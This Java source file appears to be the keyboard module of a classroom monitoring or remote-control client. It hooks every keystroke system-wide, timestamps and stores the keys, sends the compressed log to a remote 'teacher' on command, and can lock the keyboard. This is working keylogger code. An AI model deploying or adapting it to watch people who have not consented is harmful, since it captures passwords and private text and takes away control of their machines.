package com.godpalace.student.module;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.godpalace.student.Teacher;
import com.godpalace.student.manager.ThreadPoolManager;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import lombok.extern.slf4j.Slf4j;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Date;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedDeque;
import java.util.zip.GZIPOutputStream;

@Slf4j
public class KeyboardModule implements Module {
    private static final short GET_KEYBOARD_RECORD = 0x01;
    private static final short DISABLE_KEYBOARD    = GET_KEYBOARD_RECORD + 1;
    private static final short ENABLE_KEYBOARD     = DISABLE_KEYBOARD + 1;

    private static final ConcurrentLinkedDeque<KeyboardData> keyboardData =
            new ConcurrentLinkedDeque<>();

    private static native void DisableKeyboard();
    private static native void EnableKeyboard();

    static  {
        // 注册全局键盘监听
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            log.error("Failed to register global keyboard listener.", e);
        }

        // 监听键盘事件
        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
                Date newDate = new Date();
                int key = nativeEvent.getKeyCode();

                if (keyboardData.isEmpty() || key == NativeKeyEvent.VC_ENTER ||
                        Math.abs(newDate.getTime() - keyboardData.peekLast().date()) > 2000) {

                    LinkedList<Integer> keys = new LinkedList<>();
                    if (key != NativeKeyEvent.VC_ENTER) {
                        keys.add(key);
                    } else {
                        if (!keyboardData.isEmpty()) {
                            keyboardData.peekLast().keys().add(key);
                        }
                    }

                    keyboardData.add(new KeyboardData(newDate.getTime(), keys));
                } else {
                    keyboardData.peekLast().keys().add(key);
                }
            }
        });

        // 定时清理键盘记录
        ThreadPoolManager.getExecutor().execute(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        synchronized (this) {
                            wait(5000);
                        }

                        if (keyboardData.size() > 300) {
                            keyboardData.clear();
                        }
                    } catch (Exception e) {
                        log.error("Failed to execute keyboard record task.", e);
                        break;
                    }
                }
            }
        });

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            // 关闭时注销全局键盘监听
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (Exception e) {
                log.error("Failed to unregister global keyboard listener.", e);
            }

            // 启用键盘
            EnableKeyboard();
        }));

        log.debug("Global keyboard listener registered.");
    }

    @Override

    public short getID() {
        return 0x06;
    }

    @Override
    public String getName() {
        return "KeyboardModule";
    }

    @Override
    public ByteBuf execute(Teacher teacher, ByteBuf data) throws Exception {
        switch (data.readShort()) {
            case GET_KEYBOARD_RECORD -> {
                ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
                GZIPOutputStream gzipOut = new GZIPOutputStream(byteOut);
                ObjectOutputStream objOut = new ObjectOutputStream(gzipOut);

                for (KeyboardData keyboard : keyboardData) {
                    keyboard.writeToStream(objOut);
                }

                objOut.flush();
                gzipOut.finish();
                gzipOut.flush();
                byteOut.flush();

                ByteBuf response = Unpooled.buffer(2 + byteOut.size());
                response.writeShort((short) keyboardData.size());
                response.writeBytes(byteOut.toByteArray());

                objOut.close();
                gzipOut.close();
                byteOut.close();

                return response;
            }

            case DISABLE_KEYBOARD -> DisableKeyboard();
            case ENABLE_KEYBOARD -> EnableKeyboard();
        }

        return null;
    }

    @Override
    public boolean isLocalModule() {
        return false;
    }

    record KeyboardData(long date, LinkedList<Integer> keys) implements Serializable {
        public void writeToStream(ObjectOutputStream out) throws IOException {
            out.writeLong(date);
            out.writeObject(keys);
        }
    }
}
